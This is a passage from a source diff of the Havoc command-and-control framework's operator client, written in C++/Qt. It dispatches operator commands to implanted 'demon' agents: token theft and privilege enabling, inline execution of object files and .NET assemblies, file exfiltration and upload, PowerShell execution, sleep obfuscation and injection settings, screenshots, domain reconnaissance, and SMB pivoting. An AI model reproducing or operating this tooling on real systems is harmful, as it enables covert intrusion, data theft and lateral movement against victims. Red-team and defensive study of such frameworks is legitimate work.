+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.Token( TaskID, "remove", TargetProcessID ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "clear" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to clear token vault" );
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Token( TaskID, "clear", "" ) )
+            }
+            else if ( InputCommands[ 1 ].compare( "getuid" ) == 0 )
+            {
+                TaskID = CONSOLE_INFO( "Tasked demon to get current user id" );
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Token( TaskID, "getuid", "" ) )
+            }
+            else if ( InputCommands[ 1 ].compare( "privs-add" ) == 0 )
+            {
+                TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to enable all token privileges" );
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Token( TaskID, "privs-get", "" ) );
+            }
+            else if ( InputCommands[ 1 ].compare( "privs-list" ) == 0 )
+            {
+                TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list current token privileges" );
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Token( TaskID, "privs-list", "" ) );
+            }
+            else
+            {
+                CONSOLE_ERROR( "Module command not found" )
+                return false;
+            }
+
+        }
+        else if ( InputCommands[ 0 ].compare( "inline-execute" ) == 0 )
+        {
+            auto Path = InputCommands[ 1 ];
+            auto Args = QString( "" );
+            if ( InputCommands.size() > 3 )
+            {
+                InputCommands[ 0 ] = "";
+                InputCommands[ 1 ] = "";
+                InputCommands[ 2 ] = "";
+                Args = InputCommands.join(" ");
+            }
+
+            if ( ! QFile::exists( Path ) )
+            {
+                CONSOLE_ERROR( "Specified object file not found: " + Path )
+                return false;
+            }
+
+            TaskID = DemonConsole->TaskInfo(Send, nullptr, "Tasked demon to execute an object file: " + Path);
+            CommandInputList[TaskID] = commandline;
+
+            SEND( Execute.InlineExecute( TaskID, "go", Path, Args, "default" ); )
+        }
+        else if (InputCommands[ 0 ].compare( "dotnet" ) == 0)
+        {
+            if ( InputCommands.size() == 1 )
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError("Not enough arguments");
+                return false;
+            }
+            else if ( InputCommands[ 1 ].compare( "inline-execute" ) == 0 )
+            {
+                QString File = InputCommands[2];
+                QString Args;
+
+                if (InputCommands.size() > 3)
+                {
+                    InputCommands[2] = "";
+                    InputCommands[0] = "";
+                    InputCommands[1] = "";
+                    Args = InputCommands.join(" ");
+                }
+
+                if ( ! QFile::exists( File ) )
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError("Couldn't find assembly file: " + File);
+                    return false;
+                }
+
+                TaskID = DemonConsole->TaskInfo(Send, nullptr, "Tasked demon to inline execute a dotnet assembly: " + File);
+                CommandInputList[TaskID] = commandline;
+
+                if (Send) Execute.AssemblyInlineExecute(TaskID, File, Args);
+
+            }
+            else if ( InputCommands[ 1 ].compare( "list-versions" ) == 0 )
+            {
+                TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to list available dotnet versions" );
+                CommandInputList[TaskID] = commandline;
+
+                SEND( Execute.AssemblyListVersions( TaskID ) )
+            }
+            else if (InputCommands[1].compare("search") == 0)
+            {
+                // search
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "download" ) == 0 )
+        {
+            if ( InputCommands.size() >= 2 )
+            {
+                auto FilePath = JoinAtIndex( InputCommands, 1 );
+
+                TaskID                     = CONSOLE_INFO( "Tasked demon to download a file " + FilePath );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.FS( TaskID, "download", FilePath.toLocal8Bit().toBase64() ) )
+            }
+            else
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "upload" ) == 0 )
+        {
+            if ( InputCommands.size() >= 3 )
+            {
+                auto FilePath   = InputCommands[ 1 ];
+                auto RemotePath = JoinAtIndex( InputCommands, 2 );
+                auto Content    = FileRead( FilePath );
+
+                if ( Content == nullptr )
+                    return false;
+
+                TaskID                     = CONSOLE_INFO( "Tasked demon to upload a file " + FilePath + " to " + RemotePath );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.FS( TaskID, "upload", RemotePath.toLocal8Bit().toBase64() + ";" + Content.toBase64() ) )
+            } else {
+                CONSOLE_ERROR( "Not enough arguments" )
+                return false;
+            }
+
+        }
+        else if ( InputCommands[ 0 ].compare( "powershell" ) == 0 )
+        {
+            if ( InputCommands.length() > 1 )
+            {
+                auto Args = QString( R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C )" + JoinAtIndex( InputCommands, 1 ) ).toUtf8().toBase64(); // InputCommands[ 1 ].;
+
+                TaskID = CONSOLE_INFO( "Tasked demon to execute a powershell command/script" );
+                CommandInputList[ TaskID ] = commandline;
+
+                SEND( Execute.ProcModule( TaskID, 4, "0;;FALSE;TRUE;" + Args ) )
+            }
+            else
+            {
+                CONSOLE_ERROR( "Not enough arguments" )
+            }
+
+        }
+        else if ( InputCommands[ 0 ].compare( "config" ) == 0 )
+        {
+            if ( InputCommands.size() > 1 )
+            {
+                if ( InputCommands[ 1 ].compare( "implant.sleep-mask" ) == 0 )
+                {
+                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure sleep-mask: " + InputCommands[ 2 ] );
+                }
+                if ( InputCommands[ 1 ].compare( "implant.coffee.veh" ) == 0 )
+                {
+                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure coffee VEH: " + InputCommands[ 2 ] );
+                }
+                if ( InputCommands[ 1 ].compare( "implant.coffee.threaded" ) == 0 )
+                {
+                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure coffee threading: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "implant.verbose" ) == 0 )
+                {
+                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure verbose messaging: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf" ) == 0 )
+                {
+                    if ( InputCommands[ 2 ].compare( "true" ) != 0 && InputCommands[ 2 ].compare( "false" ) != 0 )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to enable/disable sleep-obf: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf.start-addr" ) == 0 )
+                {
+                    /*if ( InputCommands[ 2 ].contains( "!" ) && InputCommands[ 2 ].compare( "+" ) )
+                    {
+                        CONSOLE_ERROR( "Wrong arguments" )
+                        return false;
+                    }*/
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure sleep-mask thread start addr: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "implant.sleep-obf.technique" ) == 0 )
+                {
+                    auto regex = QRegExp( "\\d*" );
+
+                    if ( ! regex.exactMatch( InputCommands[ 2 ] ) )
+                    {
+                        CONSOLE_ERROR( "Wrong argument: Is not a number" )
+                        return false;
+                    }
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure sleep-mask thread start addr: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "memory.alloc" ) == 0 ) // TODO: finish this
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure memory allocation: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "memory.execute" ) == 0 ) // TODO: finish this
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure memory executing: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "inject.technique" ) == 0 ) // TODO: finish this
+                {
+                    TaskID = CONSOLE_INFO( "Tasked demon to configure injection technique: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "inject.spoofaddr" ) == 0 ) // TODO: finish this
+                {
+                    TaskID = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to configure spoof thread start addr of injected code: " + InputCommands[ 2 ] );
+                }
+                else if ( InputCommands[ 1 ].compare( "process.spawn" ) == 0 )
+                {
+                    TaskID = DemonConsole->TaskInfo(Send, nullptr, "Tasked demon to configure default target process: " + InputCommands[ 2 ] );
+                }
+                else
+                {
+                    DemonConsole->Console->append( "" );
+                    DemonConsole->Console->append( Prompt );
+                    DemonConsole->TaskError( "Config does not exist" );
+                    return false;
+                }
+
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Config( TaskID, InputCommands[ 1 ], InputCommands[ 2 ] ) );
+            }
+            else
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError( "Not enough arguments" );
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "screenshot" ) == 0 )
+        {
+            TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to take a screenshot" );
+            CommandInputList[ TaskID ] = commandline;
+
+            SEND( Execute.Screenshot( TaskID ) )
+        }
+        else if ( InputCommands[ 0 ].compare( "net" ) == 0 )
+        {
+            if ( InputCommands.size() > 1 )
+            {
+                auto Command = QString();
+                auto Param   = QString();
+
+                Param = "\\\\localhost";
+
+                if ( InputCommands[ 1 ].compare( "domain" ) == 0 )
+                {
+                    Command = "1";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to display domain for this host" );
+                    Param   = "";
+                }
+                else if ( InputCommands[ 1 ].compare( "logons" ) == 0 )
+                {
+                    Command = "2";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists users logged onto a host" );
+                }
+                else if ( InputCommands[ 1 ].compare( "sessions" ) == 0 )
+                {
+                    Command = "3";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists sessions on a host" );
+                }
+                else if ( InputCommands[ 1 ].compare( "computers" ) == 0 )
+                {
+                    Command = "4";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists computer in a domain (groups)" );
+                }
+                else if ( InputCommands[ 1 ].compare( "dclist" ) == 0 )
+                {
+                    Command = "5";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists domain controllers" );
+                }
+                else if ( InputCommands[ 1 ].compare( "share" ) == 0 )
+                {
+                    Command = "6";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists shares on a host" );
+                }
+                else if ( InputCommands[ 1 ].compare( "localgroup" ) == 0 )
+                {
+                    Command = "7";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists local groups and users in local groups" );
+                }
+                else if ( InputCommands[ 1 ].compare( "group" ) == 0 )
+                {
+                    Command = "8";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists groups and users in groups" );
+                }
+                else if ( InputCommands[ 1 ].compare( "users" ) == 0 )
+                {
+                    Command = "9";
+                    TaskID  = CONSOLE_INFO( "Tasked demon to lists users and user information" );
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Command not found: " + InputCommands.join( ' ' ) )
+                    return false;
+                }
+
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Net( TaskID, Command, Param ) )
+
+            }
+            else
+            {
+                CONSOLE_ERROR( "No sub command specified" )
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "pivot" ) == 0 )
+        {
+            if ( InputCommands.size() > 1 )
+            {
+                auto Command = QString();
+                auto Param   = QString();
+
+                if ( InputCommands[ 1 ].compare( "list" ) == 0 )
+                {
+                    TaskID  = CONSOLE_INFO( "Tasked demon to list connected agent pivots" );
+                    Command = "1";
+                }
+                else if ( InputCommands[ 1 ].compare( "connect" ) == 0 )
+                {
+                    // TODO: For now only Smb
+                    Command = "10";
+                    if ( InputCommands.size() > 2 )
+                    {
+                        Param = InputCommands[ 2 ];
+                        TaskID = CONSOLE_INFO( "Tasked demon to connect to a smb pivot: " + Param );
+                    }
+                    else
+                    {
+                        CONSOLE_ERROR( "Not enough arguments" )
+                        return false;
+                    }
+                }
+                else if ( InputCommands[ 1 ].compare( "disconnect" ) == 0 )
+                {
+
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Command not found: " + InputCommands.join( ' ' ) )
+                    return false;
+                }
+
+                CommandInputList[ TaskID ] = commandline;
+                SEND( Execute.Pivot( TaskID, Command, Param ) )
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "exit" ) == 0 )
+        {
+            if ( InputCommands.length() > 1 )
+            {
+                if ( InputCommands[ 1 ].compare( "thread" ) == 0 )
+                {
+                    TaskID                     = DemonConsole->TaskInfo( Send, nullptr, "Tasked demon to cleanup and exit the thread" );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.Exit( TaskID, "thread" ) )
+                }
+                else if ( InputCommands[ 1 ].compare( "process" ) == 0 )
+                {
+                    TaskID                     = CONSOLE_INFO( "Tasked demon to cleanup and exit the process" );
+                    CommandInputList[ TaskID ] = commandline;
+
+                    SEND( Execute.Exit( TaskID, "process" ) )
+                }
+                else
+                {
+                    CONSOLE_ERROR( "Option not found: " + InputCommands[ 1 ] )
+                    return false;
+                }
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "clear" ) == 0 )
+        {
+            auto AgentMessageInfo = QString();
+            auto PivotStream      = QString();
+            auto prev_cursor      = QTextCursor();
+
+            DemonConsole->Console->clear();
+
+            if ( DemonConsole->SessionInfo.PivotParent.size() > 0 )
+            {
+                PivotStream = "[Pivot: " + DemonConsole->SessionInfo.PivotParent + Util::ColorText::Cyan( "-<>-<>-" ) + DemonConsole->SessionInfo.Name + "]";
+            }
+            else
+            {
+                PivotStream = "[Pivot: "+ Util::ColorText::Cyan( "Direct" ) +"]";
+            }
+
+            AgentMessageInfo =
+                    Util::ColorText::Comment( "[" + DemonConsole->SessionInfo.First + "]" ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated from " + Util::ColorText::Cyan( DemonConsole->SessionInfo.External ) + " as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
+                    " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;
+
+            prev_cursor = DemonConsole->Console->textCursor();
+
+            DemonConsole->Console->moveCursor ( QTextCursor::End );
+            DemonConsole->Console->insertHtml( AgentMessageInfo );
+            DemonConsole->Console->setTextCursor( prev_cursor );
+
+            return true;
+        }
+        else if ( InputCommands[ 0 ].compare( "" ) == 0 )
+        {
+            // do nothing
+        }
+
+        // check for registered commands
+        for ( auto& Command : HavocX::Teamserver.RegisteredCommands )
+        {
+            if ( InputCommands[ 0 ].isEmpty() )
+                break;
+
+            if ( InputCommands[ 0 ].compare( Command.Module.c_str() ) == 0 )
+            {
+                if ( InputCommands[ 1 ].compare( Command.Command.c_str() ) == 0 )
+                {
+                    PyObject* FuncArgs  = PyTuple_New( InputCommands.size() );
+                    PyObject* Return    = NULL;
+
+                    /*if ( Send )
+                    {
+                        NewPackageCommand( Teamserver, Util::Packager::Body_t {
+                                .SubEvent = Util::Packager::Session::SendCommand,
+                                .Info     = {
+                                        { "TaskID",      TaskID.toStdString() },
+                                        { "DemonID",     DemonConsole->SessionInfo.Name.toStdString() },
+                                        { "CommandID",   "Python Plugin" },
+                                        { "CommandLine", commandline.toStdString() },
+                                },
+                        } );
+                    }*/
+
+                    if ( ! PyCallable_Check( ( PyObject* ) Command.Function ) )
+                    {
+                        PyErr_SetString( PyExc_TypeError, "a callable is required" );
+                        return false;
+                    }
+
+                    // First arg is the DemonID
+                    PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( this->DemonID.toStdString().c_str() ) );
+
+                    DemonConsole->AppendRaw();
+                    DemonConsole->AppendRaw( Prompt );
+
+                    if ( InputCommands.size() > 1 )
+                    {
+                        // Set arguments of the functions
+                        for ( u32 i = 1; i < InputCommands.size(); i++ )
+                            PyTuple_SetItem( FuncArgs, i, PyUnicode_FromString( InputCommands[ i ].toStdString().c_str() ) );
+
+                        Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );
+                    }
+                    else
+                    {
+                        Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );
+                    }
+
+                    if ( PyErr_Occurred() )
+                    {
+                        PyErr_PrintEx( 0 );
+                        PyErr_Clear();
+                    }
+
+                    Py_CLEAR( Return );
+
+                    return true;
+                }
+            }
+            else if ( InputCommands[ 0 ].compare( Command.Command.c_str() ) == 0 )
+            {
+
+                PyObject* FuncArgs = PyTuple_New( InputCommands.size() );
+                PyObject* Return   = NULL;
+
+                if ( Send )
+                {
+                    NewPackageCommand( Teamserver, Util::Packager::Body_t {
+                            .SubEvent = Util::Packager::Session::SendCommand,
+                            .Info     = {
+                                    { "TaskID",      TaskID.toStdString() },
+                                    { "DemonID",     DemonConsole->SessionInfo.Name.toStdString() },
+                                    { "CommandID",   "Python Plugin" },
+                                    { "CommandLine", commandline.toStdString() },
+                            },
+                    } );
+                }
+
+                if ( ! PyCallable_Check( ( PyObject* ) Command.Function ) )
+                {
+                    PyErr_SetString( PyExc_TypeError, "a callable is required" );
+                    return false;
+                }
+
+                // First arg is the DemonID
+                PyTuple_SetItem( FuncArgs, 0, PyUnicode_FromString( this->DemonID.toStdString().c_str() ) );
+
+                if ( InputCommands.size() > 1 )
+                {
+                    // Set arguments of the functions
+                    for ( u32 i = 1; i < InputCommands.size(); i++ )
+                        PyTuple_SetItem( FuncArgs, i, PyUnicode_FromString( InputCommands[ i ].toStdString().c_str() ) );
+
+                    Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );
+                }
+                else
+                    Return = PyObject_CallObject( ( PyObject* ) Command.Function, FuncArgs );
+
+                if ( PyErr_Occurred() )
+                {
+                    PyErr_PrintEx( 0 );
+                    PyErr_Clear();
+                }
+
+                if ( ! Return )
+                    return false;
+
+                Py_CLEAR( Return );
+
+                return true;
+            }
+        }
+    }
+    else
+    {
+
+        if ( InputCommands[ 0 ].compare( "help" ) == 0 )
+        {
+            if ( InputCommands.size() > 1 && InputCommands[ 1 ] != "" )
+            {
+                spdlog::info( "show help for command" );
+            }
+            else
+            {
+                int TotalSize = 24;
+
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( "  Command                 Type         Description" );
+                DemonConsole->Console->append( "  ---------               -------      -----------" );
+
+                for ( auto & command : AgentData.Commands )
+                {
+                    auto Spaces = std::string( ( TotalSize - command.Name.size() ), ' ' );
+                    DemonConsole->Console->append( "  " + command.Name + QString( std::string( ( TotalSize - command.Name.size() ), ' ' ).c_str() ) + "Command" + "      "  + command.Description );
+                }
+            }
+        }
+        else if ( InputCommands[ 0 ].compare( "clear" ) == 0 )
+        {
+            auto AgentMessageInfo = QString();
+            auto PivotStream      = QString();
+            auto prev_cursor      = QTextCursor();
+
+            DemonConsole->Console->clear();
+
+            if ( DemonConsole->SessionInfo.PivotParent.size() > 0 )
+            {
+                PivotStream = "[Pivot: " + DemonConsole->SessionInfo.PivotParent + Util::ColorText::Cyan( "-<>-<>-" ) + DemonConsole->SessionInfo.Name + "]";
+            }
+            else
+            {
+                PivotStream = "[Pivot: "+ Util::ColorText::Cyan( "Direct" ) +"]";
+            }
+
+            AgentMessageInfo =
+                    Util::ColorText::Comment(  "[" +  DemonConsole->SessionInfo.First + "]" ) + " Agent "+ Util::ColorText::Red( DemonConsole->SessionInfo.Name.toUpper() ) + " authenticated from " + Util::ColorText::Cyan( DemonConsole->SessionInfo.External ) + " as "+ Util::ColorText::Purple( DemonConsole->SessionInfo.Computer + "\\" + DemonConsole->SessionInfo.User ) +
+                    " :: [Internal: "+Util::ColorText::Cyan( DemonConsole->SessionInfo.Internal ) + "] [Process: " + Util::ColorText::Red( DemonConsole->SessionInfo.Process +"\\"+ DemonConsole->SessionInfo.PID ) + "] [Arch: " +Util::ColorText::Pink( DemonConsole->SessionInfo.Arch ) + "] " + PivotStream;
+
+            prev_cursor = DemonConsole->Console->textCursor();
+
+            DemonConsole->Console->moveCursor ( QTextCursor::End );
+            DemonConsole->Console->insertHtml( AgentMessageInfo );
+            DemonConsole->Console->setTextCursor( prev_cursor );
+
+            return true;
+        }
+        else
+        {
+            auto CommandInput = QMap<string, string>();
+            auto ParamArray   = commandline.split( " " );
+
+            ParamArray.erase( ParamArray.begin() );
+
+            for ( auto & command : AgentData.Commands )
+            {
+                if ( InputCommands[ 0 ].compare( command.Name ) == 0 )
+                {
+                    TaskID = CONSOLE_INFO( "Tasked " + DemonConsole->SessionInfo.Name + " to execute task" );
+
+                    CommandInput.insert( "TaskID", TaskID.toStdString() );
+                    CommandInput.insert( "CommandLine", commandline.toStdString() );
+                    CommandInput.insert( "DemonID", DemonConsole->SessionInfo.Name.toStdString() );
+                    CommandInput.insert( "Command", command.Name.toStdString() );
+
+                    ParamArray.push_back("");
+                    for ( u32 i = 0; i < command.Params.size(); i++ )
+                    {
+                        auto Value = QString();
+
+                        if ( command.Params[ i ].IsFilePath )
+                        {
+                            spdlog::info( "Is FilePath" );
+                            Value = FileRead( ParamArray[ i ] ).toBase64();
+                        }
+                        else
+                        {
+                            if ( ParamArray.size() > 1 && command.Params.size() == 1 )
+                                Value = ParamArray.join( " " );
+                            else
+                                Value = ParamArray[ i ];
+                        }
+
+                        CommandInput.insert( command.Params[ i ].Name.toStdString(), Value.toStdString() );
+                    }
+                }
+            }
+
+            SEND( Execute.AgentCommand( CommandInput ) )
+
+            /*if ( InputCommands.size() == 1 )
+            {
+                DemonConsole->Console->append( "" );
+                DemonConsole->Console->append( Prompt );
+                DemonConsole->TaskError( "Specify a cmd command !!" );
+                return false;
+            }
+
+            TaskID                      = DemonConsole->TaskInfo( Send, TaskID, "Tasked demon to execute a shell command" );
+            InputCommands[ 0 ]          = "";
+            CommandInputList[ TaskID ]  = commandline;
+
+            SEND( Execute.Spawn( TaskID, R"(c:\windows\system32\cmd.exe /c)" + InputCommands.join(" ") ) );*/
+        }
+
+    }
+
+    return true;
+}
